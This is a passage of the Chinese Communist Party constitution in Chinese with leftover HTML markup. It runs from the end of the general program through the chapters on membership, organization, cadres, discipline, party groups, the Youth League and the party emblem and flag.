中国共产党的领导是中国特色社会主义最本质的特征，是中国特色社会主义制度的最大优势，党是最高政治领导力量。党政军民学，东西南北中，党是领导一切的。党要适应改革开放和社会主义现代化建设的要求，坚持科学执政、民主执政、依法执政，加强和改善党的领导。党必须按照总揽全局、协调各方的原则，在同级各种组织中发挥领导核心作用。党必须集中精力领导经济建设，组织、协调各方面的力量，同心协力，围绕经济建设开展工作，促进经济社会全面发展。党必须实行民主的科学的决策，制定和执行正确的路线、方针、政策，做好党的组织工作和宣传教育工作，发挥全体党员的先锋模范作用。党必须在宪法和法律的范围内活动。党必须保证国家的立法、司法、行政、监察机关，经济、文化组织和人民团体积极主动地、独立负责地、协调一致地工作。党必须加强对工会、共产主义青年团、妇女联合会等群团组织的领导，使它们保持和增强政治性、先进性、群众性，充分发挥作用。党必须适应形势的发展和情况的变化，完善领导体制，改进领导方式，增强执政能力。共产党员必须同党外群众亲密合作，共同为建设中国特色社会主义而奋斗。</p><h2 id="x3D-x3D-第一章-党-员-x3D-x3D"><a href="#x3D-x3D-第一章-党-员-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;第一章　党　员&#x3D;&#x3D;"></a>&#x3D;&#x3D;第一章　党　员&#x3D;&#x3D;</h2><p>　　第一条　年满十八岁的中国工人、农民、军人、知识分子和其他社会阶层的先进分子，承认党的纲领和章程，愿意参加党的一个组织并在其中积极工作、执行党的决议和按期交纳党费的，可以申请加入中国共产党。</p><p>　　第二条　中国共产党党员是中国工人阶级的有共产主义觉悟的先锋战士。</p><p>　　中国共产党党员必须全心全意为人民服务，不惜牺牲个人的一切，为实现共产主义奋斗终身。</p><p>　　中国共产党党员永远是劳动人民的普通一员。除了法律和政策规定范围内的个人利益和工作职权以外，所有共产党员都不得谋求任何私利和特权。</p><p>　　第三条　党员必须履行下列义务：</p><p>　　（一）认真学习马克思列宁主义、毛泽东思想、邓小平理论、“三个代表”重要思想、科学发展观、习近平新时代中国特色社会主义思想，学习党的路线、方针、政策和决议，学习党的基本知识和党的历史，学习科学、文化、法律和业务知识，努力提高为人民服务的本领。</p><p>　　（二）增强“四个意识”、坚定“四个自信”、做到“两个维护”，贯彻执行党的基本路线和各项方针、政策，带头参加改革开放和社会主义现代化建设，带动群众为经济发展和社会进步艰苦奋斗，在生产、工作、学习和社会生活中起先锋模范作用。</p><p>　　（三）坚持党和人民的利益高于一切，个人利益服从党和人民的利益，吃苦在前，享受在后，克己奉公，多做贡献。</p><p>　　（四）自觉遵守党的纪律，首先是党的政治纪律和政治规矩，模范遵守国家的法律法规，严格保守党和国家的秘密，执行党的决定，服从组织分配，积极完成党的任务。</p><p>　　（五）维护党的团结和统一，对党忠诚老实，言行一致，坚决反对一切派别组织和小集团活动，反对阳奉阴违的两面派行为和一切阴谋诡计。</p><p>　　（六）切实开展批评和自我批评，勇于揭露和纠正违反党的原则的言行和工作中的缺点、错误，坚决同消极腐败现象作斗争。</p><p>　　（七）密切联系群众，向群众宣传党的主张，遇事同群众商量，及时向党反映群众的意见和要求，维护群众的正当利益。</p><p>　　（八）发扬社会主义新风尚，带头实践社会主义核心价值观和社会主义荣辱观，提倡共产主义道德，弘扬中华民族传统美德，为了保护国家和人民的利益，在一切困难和危险的时刻挺身而出，英勇斗争，不怕牺牲。</p><p>　　第四条　党员享有下列权利：</p><p>　　（一）参加党的有关会议，阅读党的有关文件，接受党的教育和培训。</p><p>　　（二）在党的会议上和党报党刊上，参加关于党的政策问题的讨论。</p><p>　　（三）对党的工作提出建议和倡议。</p><p>　　（四）在党的会议上有根据地批评党的任何组织和任何党员，向党负责地揭发、检举党的任何组织和任何党员违法乱纪的事实，要求处分违法乱纪的党员，要求罢免或撤换不称职的干部。</p><p>　　（五）行使表决权、选举权，有被选举权。</p><p>　　（六）在党组织讨论决定对党员的党纪处分或作出鉴定时，本人有权参加和进行申辩，其他党员可以为他作证和辩护。</p><p>　　（七）对党的决议和政策如有不同意见，在坚决执行的前提下，可以声明保留，并且可以把自己的意见向党的上级组织直至中央提出。</p><p>　　（八）向党的上级组织直至中央提出请求、申诉和控告，并要求有关组织给以负责的答复。</p><p>　　党的任何一级组织直至中央都无权剥夺党员的上述权利。</p><p>　　第五条　发展党员，必须把政治标准放在首位，经过党的支部，坚持个别吸收的原则。</p><p>　　申请入党的人，要填写入党志愿书，要有两名正式党员作介绍人，要经过支部大会通过和上级党组织批准，并且经过预备期的考察，才能成为正式党员。</p><p>　　介绍人要认真了解申请人的思想、品质、经历和工作表现，向他解释党的纲领和党的章程，说明党员的条件、义务和权利，并向党组织作出负责的报告。</p><p>　　党的支部委员会对申请入党的人，要注意征求党内外有关群众的意见，进行严格的审查，认为合格后再提交支部大会讨论。</p><p>　　上级党组织在批准申请人入党以前，要派人同他谈话，作进一步的了解，并帮助他提高对党的认识。</p><p>　　在特殊情况下，党的中央和省、自治区、直辖市委员会可以直接接收党员。</p><p>　　第六条　预备党员必须面向党旗进行入党宣誓。誓词如下：我志愿加入中国共产党，拥护党的纲领，遵守党的章程，履行党员义务，执行党的决定，严守党的纪律，保守党的秘密，对党忠诚，积极工作，为共产主义奋斗终身，随时准备为党和人民牺牲一切，永不叛党。</p><p>　　第七条　预备党员的预备期为一年。党组织对预备党员应当认真教育和考察。</p><p>　　预备党员的义务同正式党员一样。预备党员的权利，除了没有表决权、选举权和被选举权以外，也同正式党员一样。</p><p>　　预备党员预备期满，党的支部应当及时讨论他能否转为正式党员。认真履行党员义务，具备党员条件的，应当按期转为正式党员；需要继续考察和教育的，可以延长预备期，但不能超过一年；不履行党员义务，不具备党员条件的，应当取消预备党员资格。预备党员转为正式党员，或延长预备期，或取消预备党员资格，都应当经支部大会讨论通过和上级党组织批准。</p><p>　　预备党员的预备期，从支部大会通过他为预备党员之日算起。党员的党龄，从预备期满转为正式党员之日算起。</p><p>　　第八条　每个党员，不论职务高低，都必须编入党的一个支部、小组或其他特定组织，参加党的组织生活，接受党内外群众的监督。党员领导干部还必须参加党委、党组的民主生活会。不允许有任何不参加党的组织生活、不接受党内外群众监督的特殊党员。</p><p>　　第九条　党员有退党的自由。党员要求退党，应当经支部大会讨论后宣布除名，并报上级党组织备案。</p><p>　　党员缺乏革命意志，不履行党员义务，不符合党员条件，党的支部应当对他进行教育，要求他限期改正；经教育仍无转变的，应当劝他退党。劝党员退党，应当经支部大会讨论决定，并报上级党组织批准。如被劝告退党的党员坚持不退，应当提交支部大会讨论，决定把他除名，并报上级党组织批准。</p><p>　　党员如果没有正当理由，连续六个月不参加党的组织生活，或不交纳党费，或不做党所分配的工作，就被认为是自行脱党。支部大会应当决定把这样的党员除名，并报上级党组织批准。</p><h2 id="x3D-x3D-第二章-党的组织制度-x3D-x3D"><a href="#x3D-x3D-第二章-党的组织制度-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;第二章　党的组织制度&#x3D;&#x3D;"></a>&#x3D;&#x3D;第二章　党的组织制度&#x3D;&#x3D;</h2><p>　　第十条　党是根据自己的纲领和章程，按照民主集中制组织起来的统一整体。党的民主集中制的基本原则是：</p><p>　　（一）党员个人服从党的组织，少数服从多数，下级组织服从上级组织，全党各个组织和全体党员服从党的全国代表大会和中央委员会。</p><p>　　（二）党的各级领导机关，除它们派出的代表机关和在非党组织中的党组外，都由选举产生。</p><p>　　（三）党的最高领导机关，是党的全国代表大会和它所产生的中央委员会。党的地方各级领导机关，是党的地方各级代表大会和它们所产生的委员会。党的各级委员会向同级的代表大会负责并报告工作。</p><p>　　（四）党的上级组织要经常听取下级组织和党员群众的意见，及时解决他们提出的问题。党的下级组织既要向上级组织请示和报告工作，又要独立负责地解决自己职责范围内的问题。上下级组织之间要互通情报、互相支持和互相监督。党的各级组织要按规定实行党务公开，使党员对党内事务有更多的了解和参与。</p><p>　　（五）党的各级委员会实行集体领导和个人分工负责相结合的制度。凡属重大问题都要按照集体领导、民主集中、个别酝酿、会议决定的原则，由党的委员会集体讨论，作出决定；委员会成员要根据集体的决定和分工，切实履行自己的职责。</p><p>　　（六）党禁止任何形式的个人崇拜。要保证党的领导人的活动处于党和人民的监督之下，同时维护一切代表党和人民利益的领导人的威信。</p><p>　　第十一条　党的各级代表大会的代表和委员会的产生，要体现选举人的意志。选举采用无记名投票的方式。候选人名单要由党组织和选举人充分酝酿讨论。可以直接采用候选人数多于应选人数的差额选举办法进行正式选举。也可以先采用差额选举办法进行预选，产生候选人名单，然后进行正式选举。选举人有了解候选人情况、要求改变候选人、不选任何一个候选人和另选他人的权利。任何组织和个人不得以任何方式强迫选举人选举或不选举某个人。</p><p>　　党的地方各级代表大会和基层代表大会的选举，如果发生违反党章的情况，上一级党的委员会在调查核实后，应作出选举无效和采取相应措施的决定，并报再上一级党的委员会审查批准，正式宣布执行。</p><p>　　党的各级代表大会代表实行任期制。</p><p>　　第十二条　党的中央和地方各级委员会在必要时召集代表会议，讨论和决定需要及时解决的重大问题。代表会议代表的名额和产生办法，由召集代表会议的委员会决定。</p><p>　　第十三条　凡是成立党的新组织，或是撤销党的原有组织，必须由上级党组织决定。</p><p>　　在党的地方各级代表大会和基层代表大会闭会期间，上级党的组织认为有必要时，可以调动或者指派下级党组织的负责人。</p><p>　　党的中央和地方各级委员会可以派出代表机关。</p><p>　　第十四条　党的中央和省、自治区、直辖市委员会实行巡视制度，在一届任期内，对所管理的地方、部门、企事业单位党组织实现巡视全覆盖。</p><p>　　中央有关部委和国家机关部门党组（党委）根据工作需要，开展巡视工作。</p><p>　　党的市（地、州、盟）和县（市、区、旗）委员会建立巡察制度。</p><p>　　第十五条　党的各级领导机关，对同下级组织有关的重要问题作出决定时，在通常情况下，要征求下级组织的意见。要保证下级组织能够正常行使他们的职权。凡属应由下级组织处理的问题，如无特殊情况，上级领导机关不要干预。</p><p>　　第十六条　有关全国性的重大政策问题，只有党中央有权作出决定，各部门、各地方的党组织可以向中央提出建议，但不得擅自作出决定和对外发表主张。</p><p>　　党的下级组织必须坚决执行上级组织的决定。下级组织如果认为上级组织的决定不符合本地区、本部门的实际情况，可以请求改变；如果上级组织坚持原决定，下级组织必须执行，并不得公开发表不同意见，但有权向再上一级组织报告。</p><p>　　党的各级组织的报刊和其他宣传工具，必须宣传党的路线、方针、政策和决议。</p><p>　　第十七条　党组织讨论决定问题，必须执行少数服从多数的原则。决定重要问题，要进行表决。对于少数人的不同意见，应当认真考虑。如对重要问题发生争论，双方人数接近，除了在紧急情况下必须按多数意见执行外，应当暂缓作出决定，进一步调查研究，交换意见，下次再表决；在特殊情况下，也可将争论情况向上级组织报告，请求裁决。</p><p>　　党员个人代表党组织发表重要主张，如果超出党组织已有决定的范围，必须提交所在的党组织讨论决定，或向上级党组织请示。任何党员不论职务高低，都不能个人决定重大问题；如遇紧急情况，必须由个人作出决定时，事后要迅速向党组织报告。不允许任何领导人实行个人专断和把个人凌驾于组织之上。</p><p>　　第十八条　党的中央、地方和基层组织，都必须重视党的建设，经常讨论和检查党的宣传工作、教育工作、组织工作、纪律检查工作、群众工作、统一战线工作等，注意研究党内外的思想政治状况。</p><h2 id="第三章-党的中央组织"><a href="#第三章-党的中央组织" class="headerlink" title="第三章　党的中央组织"></a>第三章　党的中央组织</h2><p>　　第十九条　党的全国代表大会每五年举行一次，由中央委员会召集。中央委员会认为有必要，或者有三分之一以上的省一级组织提出要求，全国代表大会可以提前举行；如无非常情况，不得延期举行。</p><p>　　全国代表大会代表的名额和选举办法，由中央委员会决定。</p><p>　　第二十条　党的全国代表大会的职权是：</p><p>　　（一）听取和审查中央委员会的报告；</p><p>　　（二）审查中央纪律检查委员会的报告；</p><p>　　（三）讨论并决定党的重大问题；</p><p>　　（四）修改党的章程；</p><p>　　（五）选举中央委员会；</p><p>　　（六）选举中央纪律检查委员会。</p><p>　　第二十一条　党的全国代表会议的职权是：讨论和决定重大问题；调整和增选中央委员会、中央纪律检查委员会的部分成员。调整和增选中央委员及候补中央委员的数额，不得超过党的全国代表大会选出的中央委员及候补中央委员各自总数的五分之一。</p><p>　　第二十二条　党的中央委员会每届任期五年。全国代表大会如提前或延期举行，它的任期相应地改变。中央委员会委员和候补委员必须有五年以上的党龄。中央委员会委员和候补委员的名额，由全国代表大会决定。中央委员会委员出缺，由中央委员会候补委员按照得票多少依次递补。</p><p>　　中央委员会全体会议由中央政治局召集，每年至少举行一次。中央政治局向中央委员会全体会议报告工作，接受监督。</p><p>　　在全国代表大会闭会期间，中央委员会执行全国代表大会的决议，领导党的全部工作，对外代表中国共产党。</p><p>　　第二十三条　党的中央政治局、中央政治局常务委员会和中央委员会总书记，由中央委员会全体会议选举。中央委员会总书记必须从中央政治局常务委员会委员中产生。</p><p>　　中央政治局和它的常务委员会在中央委员会全体会议闭会期间，行使中央委员会的职权。</p><p>　　中央书记处是中央政治局和它的常务委员会的办事机构；成员由中央政治局常务委员会提名，中央委员会全体会议通过。</p><p>　　中央委员会总书记负责召集中央政治局会议和中央政治局常务委员会会议，并主持中央书记处的工作。</p><p>　　党的中央军事委员会组成人员由中央委员会决定，中央军事委员会实行主席负责制。</p><p>　　每届中央委员会产生的中央领导机构和中央领导人，在下届全国代表大会开会期间，继续主持党的经常工作，直到下届中央委员会产生新的中央领导机构和中央领导人为止。</p><p>　　第二十四条　中国人民解放军的党组织，根据中央委员会的指示进行工作。中央军事委员会负责军队中党的工作和政治工作，对军队中党的组织体制和机构作出规定。</p><h2 id="第四章-党的地方组织"><a href="#第四章-党的地方组织" class="headerlink" title="第四章　党的地方组织"></a>第四章　党的地方组织</h2><p>　　第二十五条　党的省、自治区、直辖市的代表大会，设区的市和自治州的代表大会，县（旗）、自治县、不设区的市和市辖区的代表大会，每五年举行一次。</p><p>　　党的地方各级代表大会由同级党的委员会召集。在特殊情况下，经上一级委员会批准，可以提前或延期举行。</p><p>　　党的地方各级代表大会代表的名额和选举办法，由同级党的委员会决定，并报上一级党的委员会批准。</p><p>　　第二十六条　党的地方各级代表大会的职权是：</p><p>　　（一）听取和审查同级委员会的报告；</p><p>　　（二）审查同级纪律检查委员会的报告；</p><p>　　（三）讨论本地区范围内的重大问题并作出决议；</p><p>　　（四）选举同级党的委员会，选举同级党的纪律检查委员会。</p><p>　　第二十七条　党的省、自治区、直辖市、设区的市和自治州的委员会，每届任期五年。这些委员会的委员和候补委员必须有五年以上的党龄。</p><p>　　党的县（旗）、自治县、不设区的市和市辖区的委员会，每届任期五年。这些委员会的委员和候补委员必须有三年以上的党龄。</p><p>　　党的地方各级代表大会如提前或延期举行，由它选举的委员会的任期相应地改变。</p><p>　　党的地方各级委员会的委员和候补委员的名额，分别由上一级委员会决定。党的地方各级委员会委员出缺，由候补委员按照得票多少依次递补。</p><p>　　党的地方各级委员会全体会议，每年至少召开两次。</p><p>　　党的地方各级委员会在代表大会闭会期间，执行上级党组织的指示和同级党代表大会的决议，领导本地方的工作，定期向上级党的委员会报告工作。</p><p>　　第二十八条　党的地方各级委员会全体会议，选举常务委员会和书记、副书记，并报上级党的委员会批准。党的地方各级委员会的常务委员会，在委员会全体会议闭会期间，行使委员会职权；在下届代表大会开会期间，继续主持经常工作，直到新的常务委员会产生为止。</p><p>　　党的地方各级委员会的常务委员会定期向委员会全体会议报告工作，接受监督。</p><p>　　第二十九条　党的地区委员会和相当于地区委员会的组织，是党的省、自治区委员会在几个县、自治县、市范围内派出的代表机关。它根据省、自治区委员会的授权，领导本地区的工作。</p><h2 id="第五章-党的基层组织"><a href="#第五章-党的基层组织" class="headerlink" title="第五章　党的基层组织"></a>第五章　党的基层组织</h2><p>　　第三十条　企业、农村、机关、学校、医院、科研院所、街道社区、社会组织、人民解放军连队和其他基层单位，凡是有正式党员三人以上的，都应当成立党的基层组织。</p><p>　　党的基层组织，根据工作需要和党员人数，经上级党组织批准，分别设立党的基层委员会、总支部委员会、支部委员会。基层委员会由党员大会或代表大会选举产生，总支部委员会和支部委员会由党员大会选举产生，提出委员候选人要广泛征求党员和群众的意见。</p><p>　　第三十一条　党的基层委员会、总支部委员会、支部委员会每届任期三年至五年。基层委员会、总支部委员会、支部委员会的书记、副书记选举产生后，应报上级党组织批准。</p><p>　　第三十二条　党的基层组织是党在社会基层组织中的战斗堡垒，是党的全部工作和战斗力的基础。它的基本任务是：</p><p>　　（一）宣传和执行党的路线、方针、政策，宣传和执行党中央、上级组织和本组织的决议，充分发挥党员的先锋模范作用，积极创先争优，团结、组织党内外的干部和群众，努力完成本单位所担负的任务。</p><p>　　（二）组织党员认真学习马克思列宁主义、毛泽东思想、邓小平理论、“三个代表”重要思想、科学发展观、习近平新时代中国特色社会主义思想，推进“两学一做”学习教育、党史学习教育常态化制度化，学习党的路线、方针、政策和决议，学习党的基本知识，学习科学、文化、法律和业务知识。</p><p>　　（三）对党员进行教育、管理、监督和服务，提高党员素质，坚定理想信念，增强党性，严格党的组织生活，开展批评和自我批评，维护和执行党的纪律，监督党员切实履行义务，保障党员的权利不受侵犯。加强和改进流动党员管理。</p><p>　　（四）密切联系群众，经常了解群众对党员、党的工作的批评和意见，维护群众的正当权利和利益，做好群众的思想政治工作。</p><p>　　（五）充分发挥党员和群众的积极性创造性，发现、培养和推荐他们中间的优秀人才，鼓励和支持他们在改革开放和社会主义现代化建设中贡献自己的聪明才智。</p><p>　　（六）对要求入党的积极分子进行教育和培养，做好经常性的发展党员工作，重视在生产、工作第一线和青年中发展党员。</p><p>　　（七）监督党员干部和其他任何工作人员严格遵守国家法律法规，严格遵守国家的财政经济法规和人事制度，不得侵占国家、集体和群众的利益。</p><p>　　（八）教育党员和群众自觉抵制不良倾向，坚决同各种违纪违法行为作斗争。</p><p>　　第三十三条　街道、乡、镇党的基层委员会和村、社区党组织，统一领导本地区基层各类组织和各项工作，加强基层社会治理，支持和保证行政组织、经济组织和群众性自治组织充分行使职权。</p><p>　　国有企业党委（党组）发挥领导作用，把方向、管大局、保落实，依照规定讨论和决定企业重大事项。国有企业和集体企业中党的基层组织，围绕企业生产经营开展工作。保证监督党和国家的方针、政策在本企业的贯彻执行；支持股东会、董事会、监事会和经理（厂长）依法行使职权；全心全意依靠职工群众，支持职工代表大会开展工作；参与企业重大问题的决策；加强党组织的自身建设，领导思想政治工作、精神文明建设、统一战线工作和工会、共青团、妇女组织等群团组织。</p><p>　　非公有制经济组织中党的基层组织，贯彻党的方针政策，引导和监督企业遵守国家的法律法规，领导工会、共青团等群团组织，团结凝聚职工群众，维护各方的合法权益，促进企业健康发展。</p><p>　　社会组织中党的基层组织，宣传和执行党的路线、方针、政策，领导工会、共青团等群团组织，教育管理党员，引领服务群众，推动事业发展。</p><p>　　实行行政领导人负责制的事业单位中党的基层组织，发挥战斗堡垒作用。实行党委领导下的行政领导人负责制的事业单位中党的基层组织，对重大问题进行讨论和作出决定，同时保证行政领导人充分行使自己的职权。</p><p>　　各级党和国家机关中党的基层组织，协助行政负责人完成任务，改进工作，对包括行政负责人在内的每个党员进行教育、管理、监督，不领导本单位的业务工作。</p><p>　　第三十四条　党支部是党的基础组织，担负直接教育党员、管理党员、监督党员和组织群众、宣传群众、凝聚群众、服务群众的职责。</p><h2 id="第六章-党的干部"><a href="#第六章-党的干部" class="headerlink" title="第六章　党的干部"></a>第六章　党的干部</h2><p>　　第三十五条　党的干部是党的事业的骨干，是人民的公仆，要做到忠诚干净担当。党按照德才兼备、以德为先的原则选拔干部，坚持五湖四海、任人唯贤，坚持事业为上、公道正派，反对任人唯亲，努力实现干部队伍的革命化、年轻化、知识化、专业化。</p><p>　　党重视教育、培训、选拔、考核和监督干部，特别是培养、选拔优秀年轻干部。积极推进干部制度改革。</p><p>　　党重视培养、选拔女干部和少数民族干部。</p><p>　　第三十六条　党的各级领导干部必须信念坚定、为民服务、勤政务实、敢于担当、清正廉洁，模范地履行本章程第三条所规定的党员的各项义务，并且必须具备以下的基本条件：</p><p>　　（一）具有履行职责所需要的马克思列宁主义、毛泽东思想、邓小平理论、“三个代表”重要思想、科学发展观的水平，带头贯彻落实习近平新时代中国特色社会主义思想，努力用马克思主义的立场、观点、方法分析和解决实际问题，坚持讲学习、讲政治、讲正气，经得起各种风浪的考验。</p><p>　　（二）具有共产主义远大理想和中国特色社会主义坚定信念，坚决执行党的基本路线和各项方针、政策，立志改革开放，献身现代化事业，在社会主义建设中艰苦创业，树立正确政绩观，做出经得起实践、人民、历史检验的实绩。</p><p>　　（三）坚持解放思想，实事求是，与时俱进，开拓创新，认真调查研究，能够把党的方针、政策同本地区、本部门的实际相结合，卓有成效地开展工作，讲实话，办实事，求实效。</p><p>　　（四）有强烈的革命事业心和政治责任感，有实践经验，有胜任领导工作的组织能力、文化水平和专业知识。</p><p>　　（五）正确行使人民赋予的权力，坚持原则，依法办事，清正廉洁，勤政为民，以身作则，艰苦朴素，密切联系群众，坚持党的群众路线，自觉地接受党和群众的批评和监督，加强道德修养，讲党性、重品行、作表率，做到自重、自省、自警、自励，反对形式主义、官僚主义、享乐主义和奢靡之风，反对特权思想和特权现象，反对任何滥用职权、谋求私利的行为。</p><p>　　（六）坚持和维护党的民主集中制，有民主作风，有全局观念，善于团结同志，包括团结同自己有不同意见的同志一道工作。</p><p>　　第三十七条　党员干部要善于同党外干部合作共事，尊重他们，虚心学习他们的长处。</p><p>　　党的各级组织要善于发现和推荐有真才实学的党外干部担任领导工作，保证他们有职有权，充分发挥他们的作用。</p><p>　　第三十八条　党的各级领导干部，无论是由民主选举产生的，或是由领导机关任命的，他们的职务都不是终身的，都可以变动或解除。</p><p>　　年龄和健康状况不适宜于继续担任工作的干部，应当按照国家的规定退、离休。</p><h2 id="x3D-x3D-第七章-党的纪律-x3D-x3D"><a href="#x3D-x3D-第七章-党的纪律-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;第七章　党的纪律&#x3D;&#x3D;"></a>&#x3D;&#x3D;第七章　党的纪律&#x3D;&#x3D;</h2><p>　　第三十九条　党的纪律是党的各级组织和全体党员必须遵守的行为规则，是维护党的团结统一、完成党的任务的保证。党组织必须严格执行和维护党的纪律，共产党员必须自觉接受党的纪律的约束。</p><p>　　第四十条　党的纪律主要包括政治纪律、组织纪律、廉洁纪律、群众纪律、工作纪律、生活纪律。</p><p>　　坚持惩前毖后、治病救人，执纪必严、违纪必究，抓早抓小、防微杜渐，按照错误性质和情节轻重，给以批评教育、责令检查、诫勉直至纪律处分。运用监督执纪“四种形态”，让“红红脸、出出汗”成为常态，党纪处分、组织调整成为管党治党的重要手段，严重违纪、严重触犯刑律的党员必须开除党籍。</p><p>　　党内严格禁止用违反党章和国家法律的手段对待党员，严格禁止打击报复和诬告陷害。违反这些规定的组织或个人必须受到党的纪律和国家法律的追究。</p><p>　　第四十一条　对党员的纪律处分有五种：警告、严重警告、撤销党内职务、留党察看、开除党籍。</p><p>　　留党察看最长不超过两年。党员在留党察看期间没有表决权、选举权和被选举权。党员经过留党察看，确已改正错误的，应当恢复其党员的权利；坚持错误不改的，应当开除党籍。</p><p>　　开除党籍是党内的最高处分。各级党组织在决定或批准开除党员党籍的时候，应当全面研究有关的材料和意见，采取十分慎重的态度。</p><p>　　第四十二条　对党员的纪律处分，必须经过支部大会讨论决定，报党的基层委员会批准；如果涉及的问题比较重要或复杂，或给党员以开除党籍的处分，应分别不同情况，报县级或县级以上党的纪律检查委员会审查批准。在特殊情况下，县级和县级以上各级党的委员会和纪律检查委员会有权直接决定给党员以纪律处分。</p><p>　　对党的中央委员会委员、候补委员，给以警告、严重警告处分，由中央纪律检查委员会常务委员会审议后，报党中央批准。对地方各级党的委员会委员、候补委员，给以警告、严重警告处分，应由上一级纪律检查委员会批准，并报它的同级党的委员会备案。</p><p>　　对党的中央委员会和地方各级委员会的委员、候补委员，给以撤销党内职务、留党察看或开除党籍的处分，必须由本人所在的委员会全体会议三分之二以上的多数决定。在全体会议闭会期间，可以先由中央政治局和地方各级委员会常务委员会作出处理决定，待召开委员会全体会议时予以追认。对地方各级委员会委员和候补委员的上述处分，必须经过上级纪律检查委员会常务委员会审议，由这一级纪律检查委员会报同级党的委员会批准。</p><p>　　严重触犯刑律的中央委员会委员、候补委员，由中央政治局决定开除其党籍；严重触犯刑律的地方各级委员会委员、候补委员，由同级委员会常务委员会决定开除其党籍。</p><p>　　第四十三条　党组织对党员作出处分决定，应当实事求是地查清事实。处分决定所依据的事实材料和处分决定必须同本人见面，听取本人说明情况和申辩。如果本人对处分决定不服，可以提出申诉，有关党组织必须负责处理或者迅速转递，不得扣压。对于确属坚持错误意见和无理要求的人，要给以批评教育。</p><p>　　第四十四条　党组织如果在维护党的纪律方面失职，必须问责。</p><p>　　对于严重违犯党的纪律、本身又不能纠正的党组织，上一级党的委员会在查明核实后，应根据情节严重的程度，作出进行改组或予以解散的决定，并报再上一级党的委员会审查批准，正式宣布执行。</p><h2 id="第八章-党的纪律检查机关"><a href="#第八章-党的纪律检查机关" class="headerlink" title="第八章　党的纪律检查机关"></a>第八章　党的纪律检查机关</h2><p>　　第四十五条　党的中央纪律检查委员会在党的中央委员会领导下进行工作。党的地方各级纪律检查委员会和基层纪律检查委员会在同级党的委员会和上级纪律检查委员会双重领导下进行工作。上级党的纪律检查委员会加强对下级纪律检查委员会的领导。</p><p>　　党的各级纪律检查委员会每届任期和同级党的委员会相同。</p><p>　　党的中央纪律检查委员会全体会议，选举常务委员会和书记、副书记，并报党的中央委员会批准。党的地方各级纪律检查委员会全体会议，选举常务委员会和书记、副书记，并由同级党的委员会通过，报上级党的委员会批准。党的基层委员会是设立纪律检查委员会，还是设立纪律检查委员，由它的上一级党组织根据具体情况决定。党的总支部委员会和支部委员会设纪律检查委员。</p><p>　　党的中央和地方纪律检查委员会向同级党和国家机关全面派驻党的纪律检查组，按照规定向有关国有企业、事业单位派驻党的纪律检查组。纪律检查组组长参加驻在单位党的领导组织的有关会议。他们的工作必须受到该单位党的领导组织的支持。</p><p>　　第四十六条　党的各级纪律检查委员会是党内监督专责机关，主要任务是：维护党的章程和其他党内法规，检查党的路线、方针、政策和决议的执行情况，协助党的委员会推进全面从严治党、加强党风建设和组织协调反腐败工作，推动完善党和国家监督体系。</p><p>　　党的各级纪律检查委员会的职责是监督、执纪、问责，要经常对党员进行遵守纪律的教育，作出关于维护党纪的决定；对党的组织和党员领导干部履行职责、行使权力进行监督，受理处置党员群众检举举报，开展谈话提醒、约谈函询；检查和处理党的组织和党员违反党的章程和其他党内法规的比较重要或复杂的案件，决定或取消对这些案件中的党员的处分；进行问责或提出责任追究的建议；受理党员的控告和申诉；保障党员的权利。</p><p>　　各级纪律检查委员会要把处理特别重要或复杂的案件中的问题和处理的结果，向同级党的委员会报告。党的地方各级纪律检查委员会和基层纪律检查委员会要同时向上级纪律检查委员会报告。</p><p>　　各级纪律检查委员会发现同级党的委员会委员有违犯党的纪律的行为，可以先进行初步核实，如果需要立案检查的，应当在向同级党的委员会报告的同时向上一级纪律检查委员会报告；涉及常务委员的，报告上一级纪律检查委员会，由上一级纪律检查委员会进行初步核实，需要审查的，由上一级纪律检查委员会报它的同级党的委员会批准。</p><p>　　第四十七条　上级纪律检查委员会有权检查下级纪律检查委员会的工作，并且有权批准和改变下级纪律检查委员会对于案件所作的决定。如果所要改变的该下级纪律检查委员会的决定，已经得到它的同级党的委员会的批准，这种改变必须经过它的上一级党的委员会批准。</p><p>　　党的地方各级纪律检查委员会和基层纪律检查委员会如果对同级党的委员会处理案件的决定有不同意见，可以请求上一级纪律检查委员会予以复查；如果发现同级党的委员会或它的成员有违犯党的纪律的情况，在同级党的委员会不给予解决或不给予正确解决的时候，有权向上级纪律检查委员会提出申诉，请求协助处理。</p><h2 id="第九章-党-组"><a href="#第九章-党-组" class="headerlink" title="第九章　党　组"></a>第九章　党　组</h2><p>　　第四十八条　在中央和地方国家机关、人民团体、经济组织、文化组织和其他非党组织的领导机关中，可以成立党组。党组发挥领导作用。党组的任务，主要是负责贯彻执行党的路线、方针、政策；加强对本单位党的建设的领导，履行全面从严治党责任；讨论和决定本单位的重大问题；做好干部管理工作；讨论和决定基层党组织设置调整和发展党员、处分党员等重要事项；团结党外干部和群众，完成党和国家交给的任务；领导机关和直属单位党组织的工作。</p><p>　　第四十九条　党组的成员，由批准成立党组的党组织决定。党组设书记，必要时还可以设副书记。</p><p>　　党组必须服从批准它成立的党组织领导。</p><p>　　第五十条　在对下属单位实行集中统一领导的国家工作部门和有关单位的领导机关中，可以建立党委，党委的产生办法、职权和工作任务，由中央另行规定。</p><h2 id="x3D-x3D-第十章-党和共产主义青年团的关系-x3D-x3D"><a href="#x3D-x3D-第十章-党和共产主义青年团的关系-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;第十章　党和共产主义青年团的关系&#x3D;&#x3D;"></a>&#x3D;&#x3D;第十章　党和共产主义青年团的关系&#x3D;&#x3D;</h2><p>　　第五十一条　中国共产主义青年团是中国共产党领导的先进青年的群团组织，是广大青年在实践中学习中国特色社会主义和共产主义的学校，是党的助手和后备军。共青团中央委员会受党中央委员会领导。共青团的地方各级组织受同级党的委员会领导，同时受共青团上级组织领导。</p><p>　　第五十二条　党的各级委员会要加强对共青团的领导，注意团的干部的选拔和培训。党要坚决支持共青团根据广大青年的特点和需要，生动活泼地、富于创造性地进行工作，充分发挥团的突击队作用和联系广大青年的桥梁作用。</p><p>　　团的县级和县级以下各级委员会书记，企业事业单位的团委员会书记，是党员的，可以列席同级党的委员会和常务委员会的会议。</p><h2 id="x3D-x3D-第十一章-党徽党旗-x3D-x3D"><a href="#x3D-x3D-第十一章-党徽党旗-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;第十一章　党徽党旗&#x3D;&#x3D;"></a>&#x3D;&#x3D;第十一章　党徽党旗&#x3D;&#x3D;</h2><p>　　第五十三条　中国共产党党徽为镰刀和锤头组成的图案。</p><p>　　第五十四条　中国共产党党旗为旗面缀有金黄色党徽图案的红旗。</p><p>　　